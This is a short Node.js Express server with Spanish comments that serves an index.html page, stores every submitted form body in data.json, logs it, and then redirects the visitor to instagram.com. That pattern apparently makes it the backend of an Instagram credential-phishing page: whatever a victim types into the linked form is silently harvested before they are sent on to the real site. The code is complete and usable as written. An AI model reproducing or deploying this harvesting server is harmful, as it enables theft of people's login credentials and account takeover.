const fs = require('fs');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();

const instaUrl = 'https://instagram.com/';

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

let datos;

// Cargar datos desde el archivo al inicio del servidor de manera síncrona
try {
    const data = fs.readFileSync('data.json', 'utf8');
    datos = JSON.parse(data);

    // Verificar si datos es un array
    if (!Array.isArray(datos)) {
        console.error('Los datos no son un array. Reiniciando con un array vacío.');
        datos = [];
    }
} catch (err) {
    console.error('Error al leer el archivo:', err);
    datos = [];
    process.exit(1);
}

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/', (req, res) => {
    const data = req.body;

    if (data) {
        datos.push(data);
        fs.writeFileSync('data.json', JSON.stringify(datos, null, 2), 'utf-8');
        console.log('Datos recibidos -> \n', data);
        res.redirect(instaUrl);
    } else {
        res.send('Datos no enviados');
    }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Servidor activo en -> http://localhost:${PORT}/`);
});
